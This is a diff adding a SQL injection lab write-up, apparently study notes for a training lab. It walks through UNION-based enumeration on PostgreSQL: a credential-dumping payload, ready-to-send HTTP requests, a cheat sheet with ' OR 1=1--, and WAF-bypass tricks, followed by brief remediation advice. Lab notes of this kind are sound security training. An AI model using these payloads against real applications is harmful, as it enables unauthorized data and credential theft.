@@ -1139,3 +1139,293 @@ MySQL:    @@version Postgres: version() MSSQL:    @@VERSION SQLite:   sqlite_ver
 MySQL/Postgres: CONCAT(username,':',password) MSSQL: username + ':' + password Oracle: username || ':' || password
 
 ---
+
+# SQL Injection Lab-8 — UNION-Based Enumeration 
+
+---
+
+## 🔹 One-line summary
+
+UNION-based SQL injection allows an attacker to append their own SELECT queries to the backend SQL statement, enabling full enumeration of schemas, tables, and columns — eventually revealing sensitive data such as usernames and passwords.
+
+---
+
+## 🔹 What is this topic? (short)
+
+This technique abuses the UNION SELECT operator.
+By matching the correct number of columns and finding a reflected string column, the attacker can:
+
+confirm comment syntax (-- )
+count columns
+check string reflection
+enumerate schemas
+enumerate tables (in public)
+extract column names (e.g., username + password)
+
+---
+
+## 🔹 Why this matters (real-world risk)
+
+Credential exposure: attackers can dump admin usernames/passwords.
+Data mapping: complete DB structures are revealed (schemas/tables/columns).
+Privilege escalation: leaked credentials → admin panel → full compromise.
+Persistence: knowing schema/table layout helps in advanced exploitation (RCE, file writes, logic bypass).
+
+---
+
+## 🔹 High-value injection targets
+
+Category filters: /filter?category=...
+Search parameters: /search?q=...
+Product IDs: /product?id=...
+Sort/pagination parameters
+JSON API fields that trigger SQL queries
+Anything reflecting DB-driven content (tables, grids, listings)
+
+---
+
+## 🔹 Quick concept checklist
+
+' → does it break?
+--  → does comment syntax work?
+UNION SELECT NULL... → column count
+Inject 'TOK' → find reflected string column
+
+Enumerate:
+information_schema.schemata
+information_schema.tables
+information_schema.columns
+
+Dump data via UNION once structure identified
+
+---
+
+## 🔹 Lab walkthrough — exact steps 
+
+*1. Capture baseline request*
+
+Turn Burp Proxy ON → click a category/filter.
+Capture /filter?category=Gifts (or similar).
+Send it to Repeater.
+
+---
+
+*2. Test comment syntax*
+
+Send:
+
+Gifts'--
+OR
+Gifts' --
+
+A valid comment style stops the SQL parser from reading the rest of the query.
+PostgreSQL requires:
+
+--␣   (dash dash + space)
+
+---
+
+*3. Count columns (UNION + NULLs)*
+
+Try sequentially:
+
+Gifts' UNION SELECT NULL--
+
+If error → try:
+
+Gifts' UNION SELECT NULL,NULL-- 
+Gifts' UNION SELECT NULL,NULL,NULL--
+
+Stop when a normal/altered page appears.
+That number of NULLs = total column count.
+
+---
+
+*4. Find the reflected string column*
+
+Inject markers:
+
+Gifts' UNION SELECT 'TOK',NULL-- 
+Gifts' UNION SELECT NULL,'TOK'--
+
+The column where 'TOK' appears in response is the string-compatible reflected column.
+
+---
+
+*5. Enumerate schemas*
+
+Using the reflected column:
+
+Gifts' UNION SELECT schema_name,NULL 
+FROM information_schema.schemata--
+
+Look for:
+
+public
+
+This is usually the target schema.
+
+---
+
+*6. Enumerate tables (schema = public)*
+
+Gifts' UNION SELECT table_name,NULL
+FROM information_schema.tables
+WHERE table_schema='public'--
+
+Find table starting with:
+
+user…
+(e.g., users_abcd123)
+
+---
+
+*7. Enumerate columns (target table)*
+
+Gifts' UNION SELECT column_name,NULL
+FROM information_schema.columns
+WHERE table_name='users_abcd123'--
+
+Look for:
+
+username
+password
+
+---
+
+*8. Dump credentials (optional final step)*
+
+Gifts' UNION SELECT username,password
+FROM users_abcd123--
+
+Use the returned admin creds to log in.
+
+---
+
+## 🧾 Proof / Evidence
+
+*1️⃣ Screenshot — Applying -- comment*  
+![valid comment syntax '--](../images/sqli-union-comment.png)  
+Description: Repeater request showing '--  payload confirming valid comment syntax (PostgreSQL requires a trailing space).
+
+---
+
+*2️⃣ Screenshot — NULL column count test*  
+![NULL column count](../images/sqli-union-null-columns.png)  
+Description: Shows the point where UNION SELECT NULL,NULL-- returns a normal page, confirming column count = 2.
+
+---
+
+*3️⃣ Screenshot — String reflection test*  
+![String Reflection 'TOK'](../images/sqli-union-string-reflect.png)  
+Description: Response shows injected marker 'TOK', identifying the reflected string column.
+
+---
+
+*4️⃣ Screenshot — Schema enumeration* 
+![Schema enumeration](../images/sqli-union-schemata.png)  
+Description: Response lists schemas from information_schema.schemata, including the target public.
+
+---
+
+*5️⃣ Screenshot — Table enumeration under public*  
+![Table enumeration under Schema](../images/sqli-union-public-tables.png)  
+Description: Screenshot showing table names in schema public, including one starting with user….
+
+---
+
+*6️⃣ Screenshot — Column name enumeration* 
+![Column names under Table](../images/sqli-union-column-names.png)  
+Description: Shows username and password columns returned from information_schema.columns.
+
+---
+
+## 🔹 PoC / Repeater-ready example
+
+Correct column count (example: 2 columns)
+
+GET /filter?category=Gifts' UNION SELECT NULL,NULL-- HTTP/1.1  
+Host: <HOST>
+
+Find string column
+
+GET /filter?category=Gifts' UNION SELECT 'TOK',NULL-- HTTP/1.1  
+Host: <HOST>
+
+Enumerate tables in public
+
+GET /filter?category=Gifts' UNION SELECT table_name,NULL  
+FROM information_schema.tables  
+WHERE table_schema='public'-- HTTP/1.1  
+Host: <HOST>
+
+Enumerate column names
+
+GET /filter?category=Gifts' UNION SELECT column_name,NULL  
+FROM information_schema.columns  
+WHERE table_name='users_abcd123'-- HTTP/1.1  
+Host: <HOST>
+
+---
+
+## 🔹 Common payloads & quick cheats
+
+Comment remainder:
+'--
+
+Force true:
+' OR 1=1--
+
+Column count:
+UNION SELECT NULL,NULL,...
+
+Marker test:
+UNION SELECT 'MKR',NULL--
+
+Table enumeration (PostgreSQL):
+FROM information_schema.tables
+
+Column enumeration:
+FROM information_schema.columns
+
+---
+
+## 🔹 Troubleshooting
+
+Syntax errors during UNION → column count mismatch.
+Marker not visible → check HTML source, comments, attributes.
+DB error: type mismatch → use NULL for non-reflected columns.
+No tables returned → wrong schema; verify with schemata.
+WAF issues → try UN/**/ION or case variations (UnIoN SeLeCt).
+
+---
+
+## 🔹 Fixes / remediation
+
+Always use parameterized queries.
+Disable verbose SQL errors.
+Whitelist valid input values.
+Limit DB privileges (no access to entire information_schema).
+Log and alert unusual patterns (UNION, SLEEP, large metadata queries).
+
+---
+
+## 🔹 Pentest checklist
+
+1. ' test
+2. Comment test (-- )
+3. Column count with NULLs
+4. Locate reflected string column
+5. Enumerate schemas
+6. Enumerate public tables
+7. Enumerate columns
+8. Dump credentials
+9. Provide fixes + screenshots
+
+---
+
+## 🔹 Quick memory cue
+
+Quote → Comment → NULLs → TOK → Schemas → Tables → Columns → Creds
+
+---
